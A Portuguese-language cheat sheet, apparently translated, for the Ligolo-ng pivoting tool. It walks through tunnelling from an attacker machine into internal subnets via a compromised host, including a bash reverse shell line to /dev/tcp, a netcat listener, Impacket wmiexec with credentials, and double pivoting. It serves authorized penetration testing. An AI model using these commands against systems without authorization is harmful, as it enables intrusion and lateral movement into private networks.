<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔀 Ligolo-ng - Folha de dicas completa

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
  ██╗     ██╗ ██████╗  ██████╗ ██╗      ██████╗      ███╗   ██╗ ██████╗ 
  ██║     ██║██╔════╝ ██╔═══██╗██║     ██╔═══██╗     ████╗  ██║██╔════╝ 
  ██║     ██║██║  ███╗██║   ██║██║     ██║   ██║     ██╔██╗ ██║██║  ███╗
  ██║     ██║██║   ██║██║   ██║██║     ██║   ██║     ██║╚██╗██║██║   ██║
  ███████╗██║╚██████╔╝╚██████╔╝███████╗╚██████╔╝     ██║ ╚████║╚██████╔╝
  ╚══════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝      ╚═╝  ╚═══╝ ╚═════╝ 
                 Advanced TUN-based Pivoting Tool
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/Ligolo--ng-Pivoting-blue?style=for-the-badge" alt="Ligolo-ng">
  <img src="https://img.shields.io/badge/TUN_Interface-VPN_Style-green?style=for-the-badge" alt="Interface TUN">
  <img src="https://img.shields.io/badge/Go-Cross_Platform-orange?style=for-the-badge" alt="Go">
  <img src="https://img.shields.io/badge/Network_Pivoting-red?style=for-the-badge" alt="Pivotação de rede">
</p>

<p alinhar="centro">
  <b>🌐 Ferramenta de dinamização moderna, simples e de alto desempenho usando interfaces TUN em vez de proxies SOCKS</b>
</p>

---

## 📋 Índice

- [Introdução](#-introdução)
- [Por que Ligolo-ng? (Ligolo-ng vs SOCKS/Proxychains)](#-why-ligolo-ng)
- [Arquitetura e como funciona](#-arquitetura--como-funciona)
- [Instalação](#-instalação)
- [Guia de início rápido](#-guia de início rápido)
  - [Etapa 1: Configurar interface TUN no invasor](#step-1-setup-tun-interface-on-attacker)
  - [Etapa 2: Iniciar o proxy Ligolo-ng](#step-2-start-the-ligolo-ng-proxy)
  - [Etapa 3: implantar o agente no destino dinâmico](#step-3-deploy-the-agent-on-pivot-target)
  - [Etapa 4: Configurar o roteamento no invasor](#step-4-configure-routing-on-attacker)
  - [Etapa 5: Iniciar a sessão do túnel](#etapa-5-iniciar-a-sessão-do-túnel)
- [Encaminhamento reverso de porta (ouvintes)](#-reverse-port-forwarding-listeners)
- [Pivotagem dupla (Pivotagem multicamadas)](#-pivô duplo-pivotagem multicamadas)
- [Referência de comandos interativos de proxy](#-proxy-interactive-commands-reference)
- [Opções de linha de comando do agente](#-agent-command-line-options)
- [Solução de problemas e práticas recomendadas](#-solução de problemas--melhores práticas)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)
- [Recursos](#-recursos)

---

## 🎯 Introdução

**Ligolo-ng** é uma ferramenta avançada, leve e rápida de tunelamento e rotação escrita em Go. Ao contrário dos proxies SOCKS tradicionais (como Chisel padrão ou encaminhamento dinâmico SSH), o Ligolo-ng estabelece uma **interface TUN** virtual diretamente na máquina do invasor.

Isso transforma seu host pivot comprometido em um verdadeiro gateway semelhante a uma VPN: todas as ferramentas na máquina do invasor (incluindo `nmap -sS`, `crackmapexec`, `evil-winrm`, `impacket` e navegadores) podem acessar sub-redes internas diretamente pelo endereço IP sem prefixar comandos com `proxychains`.

---

## ⚖️ Por que Ligolo-ng?

| Recurso | Ligolo-ng | Proxychains + MEIAS | MEIAS SSH (`-D`) |
|--------|-----------|---------------------|------------------|
| **Suporte ao protocolo** | TCP e UDP completos | Somente TCP (UDP ruim) | Somente TCP |
| **Verificação SYN do Nmap (`-sS`)**| ✅ Sim (Nativo) | ❌ Não (requer TCP `-sT`) | ❌ Não |
| **Compatibilidade de ferramentas** | 100% (pilha IP do kernel) | Inconsistente (LD_PRELOAD) | Inconsistente |
| **Velocidade e latência** | ⭐⭐⭐⭐⭐ Muito rápido | ⭐⭐⭐ Moderado | ⭐⭐⭐ Moderado |
| **Sem invólucro de MEIAS** | ✅ Sim | ❌ Requer embalagem | ❌ Requer embalagem |
| **Ouvintes Reversos** | ✅ Integrado | ❌ Requer ferramenta separada | ❌ Limitado |

---

## 🏗️ Arquitetura e como funciona
```
+-------------------+                          +---------------------+                          +----------------------+
|  Attacker Machine |                          | Pivot Target (Host) |                          | Internal Subnet Host |
| (192.168.1.100)   |                          | (Dual-homed)        |                          | (172.16.1.50)        |
|                   |                          |                     |                          |                      |
| [proxy server]    | <=== TLS Tunnel =======> | [ligolo agent]      |                          |                      |
|    ^              |      (Port 11601)        |    |                |                          |                      |
|    |              |                          |    |                |                          |                      |
| [tun0 interface]  |                          |    +--------------->| == Internal Traffic ===> | [Target Service]     |
| (172.16.1.0/24)   |                          |     (172.16.1.10)   |                          | (Port 445, 80, etc.) |
+-------------------+                          +---------------------+                          +----------------------+
```
1. **Proxy:** é executado na máquina do invasor, gerencia sessões e conecta pacotes entre sua interface TUN virtual e os agentes conectados.
2. **Agente:** um binário leve executado na máquina interna comprometida (Linux, Windows, macOS ou ARM).
3. **Interface TUN:** Uma interface de rede de loopback de software criada no Linux que roteia o tráfego destinado a sub-redes internas diretamente para o Ligolo.

---

## 📥 Instalação

Baixe os binários de versão mais recentes para **proxy** e **agent** na página oficial de lançamentos do GitHub:
```bash
# Download latest proxy for Linux
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-proxy/

# Download agents for various targets
# Linux Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz
tar -zxvf ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-agents/linux/

# Windows Agent
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip
unzip ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip -d /opt/ligolo-agents/windows/
```
---

## 🚀 Guia de início rápido

### Etapa 1: Configurar interface TUN no invasor

Antes de executar o proxy, crie um dispositivo TUN persistente na máquina do invasor Linux:
```bash
# Create a TUN interface named "ligolo"
sudo ip tuntap add user $USER mode tun ligolo

# Bring the interface UP
sudo ip link set ligolo up

# Verify interface state
ip link show ligolo
```
### Etapa 2: inicie o proxy Ligolo-ng

Execute o proxy usando certificados TLS autoassinados:
```bash
cd /opt/ligolo-proxy/
./proxy -self-cert -laddr 0.0.0.0:11601
```
> **Dica:** você também pode fornecer certificados Let's Encrypt válidos usando `-certfile` e `-keyfile` para sigilo em compromissos do Red Team.

### Etapa 3: implantar o agente no Pivot Target

Transfira o agente para o seu host comprometido e execute-o:

#### No destino Linux:
```bash
chmod +x agent
./agent -connect 192.168.1.100:11601 -ignore-cert
```
#### No Windows Target:
```powershell
.\agent.exe -connect 192.168.1.100:11601 -ignore-cert
```
### Etapa 4: Configurar o roteamento no invasor

Depois que o agente se conectar, inspecione suas interfaces de rede no console do proxy para determinar as sub-redes internas do alvo (por exemplo, `172.16.1.0/24`).

No **terminal do invasor** (janela separada), adicione uma rota apontando para a interface TUN:
```bash
# Route internal subnet through ligolo TUN device
sudo ip route add 172.16.1.0/24 dev ligolo

# Check route table
ip route show | grep ligolo
```
### Etapa 5: iniciar a sessão do túnel

No prompt interativo do proxy Ligolo-ng:
```text
ligolo-ng » session
? Select a session: 1 - user@PIVOT-HOST - 192.168.1.50:52418
[Agent : user@PIVOT-HOST] » start
[Agent : user@PIVOT-HOST] » INFO[0025] Tunnel started
```
Agora você tem acesso IP nativo e direto à rede interna! Teste:
```bash
# Ping internal host
ping -c 3 172.16.1.50

# Native Nmap SYN scan without proxychains!
nmap -sS -Pn -T4 -p 80,445,3389 172.16.1.50

# Run Impacket directly
impacket-wmiexec DOMAIN/admin:Password@172.16.1.50
```
---

## 🔄 Encaminhamento de porta reversa (ouvintes)

Deseja receber um shell reverso ou capturar um retransmissor de autenticação NTLM na caixa do invasor de um host interno que não pode rotear de volta para o IP do invasor? Use **ouvintes**!

Quando você configura um ouvinte no Ligolo-ng, o agente abre uma porta de escuta na **máquina dinâmica** e retransmite o tráfego de entrada de volta para a máquina do invasor.

### Exemplo: capturando um shell reverso

Dentro da sessão proxy:
```text
[Agent : user@PIVOT-HOST] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
INFO[0035] Listener created on 0.0.0.0:4444
```
Na sua **máquina invasora**:
```bash
nc -lvnp 4444
```
Em um **alvo interno** (`172.16.1.75`):
```bash
# Send reverse shell to the pivot host's internal IP
bash -i >& /dev/tcp/172.16.1.10/4444 0>&1
```
O host pivô encaminha a conexão diretamente para o seu ouvinte Netcat!

---

## ⛓️ Pivotagem Dupla (Pivotagem Multicamadas)

Ao acessar redes profundamente aninhadas (Sub-rede A -> Sub-rede B -> Sub-rede C):

1. Estabeleça seu túnel inicial para o Pivô 1 (`172.16.1.10`).
2. Descubra o Pivô 2 localizado na Sub-rede B (`10.0.0.25`).
3. Configure um ouvinte no Pivô 1 para encaminhar o tráfego da sub-rede B de volta para sua porta proxy `11601`:
   ```text
   [Agent : Pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
   ```
4. Implante o agente Ligolo no Pivot 2 e conecte-se ao IP do Pivot 1:
   ```bash
   ./agent -connect 172.16.1.10:11601 -ignore-cert
   ```
5. Uma segunda sessão aparecerá no seu proxy! Adicione uma rota para a sub-rede C:
   ```bash
   sudo ip route add 10.0.0.0/24 dev ligolo
   ```
6. Mude para a sessão 2 e digite `start`.

---

## ⌨️ Referência de comandos interativos de proxy

| Comando | Descrição | Exemplo |
|---------|-------------|---------|
| `session` | Listar e selecionar sessões ativas de agentes conectados | `session` |
| `start` | Iniciar o encapsulamento de pacotes por meio do agente ativo | `start` |
| `stop` | Pare a sessão de túnel ativa | `stop` |
| `ifconfig` | Mostrar interfaces de rede do agente selecionado | `ifconfig` |
| `listener_add` | Crie uma porta de escuta no agente pivô | `listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8443` |
| `listener_list`| Listar todos os ouvintes ativos no agente atual | `listener_list` |
| `listener_close`| Fechar um ouvinte ativo específico | `listener_close --id 0` |
| `help` | Exibir ajuda do comando | `help` |
| `exit` | Encerre o proxy ou retorne ao menu principal | `exit` |

---

## ⚙️ Opções de linha de comando do agente

| Bandeira | Descrição | Exemplo |
|------|-------------|---------|
| `-connect` | Endereço e porta do proxy Ligolo | `-connect 192.168.1.100:11601` |
| `-ignore-cert` | Ignorar verificação do certificado TLS | `-ignore-cert` |
| `-retry` | Tentar novamente a conexão automaticamente se estiver desconectado | `-retry` |
| `-auto-clear` | Limpar saída do terminal durante a execução | `-auto-clear` |

---

## 💡 Solução de problemas e práticas recomendadas

1. **Excluir interface TUN após envolvimento:**
   Ao terminar o teste, limpe sua tabela de roteamento e exclua a interface virtual:
   ```bash
   sudo ip link set ligolo down
   sudo ip tuntap del mode tun ligolo
   ```
2. **Verifique novamente as sobreposições de sub-redes IP:**
   Certifique-se de que a sub-rede interna que você está roteando (por exemplo, `192.168.1.0/24`) não colida com a rede local do invasor. Se houver sobreposição, use uma rota de host `/32` mais específica (por exemplo, `sudo ip route add 192.168.1.50/32 dev ligolo`).
3. **Considerações sobre firewall no Pivot:**
   Em destinos Windows, certifique-se de que o Firewall do Windows Defender permita conexões de saída na porta 11601 ou na porta de escuta escolhida.
4. **Use `-retry` em ambientes reais:**
   Sempre execute agentes com `-retry` para restabelecer conexões automaticamente após quedas transitórias da rede.

---

## ⚠️ Isenção de responsabilidade legal

> **IMPORTANTE:** Ligolo-ng é um poderoso utilitário de roteamento de rede. Ele só deve ser utilizado durante testes de penetração autorizados, compromissos de equipe vermelha e avaliações éticas de segurança com consentimento explícito por escrito.

---

## 📚 Recursos

- [Repositório oficial do Ligolo-ng GitHub](https://github.com/nicocha30/ligolo-ng)
- [Documentação oficial do Ligolo-ng](https://github.com/nicocha30/ligolo-ng/blob/master/DOCUMENTATION.md)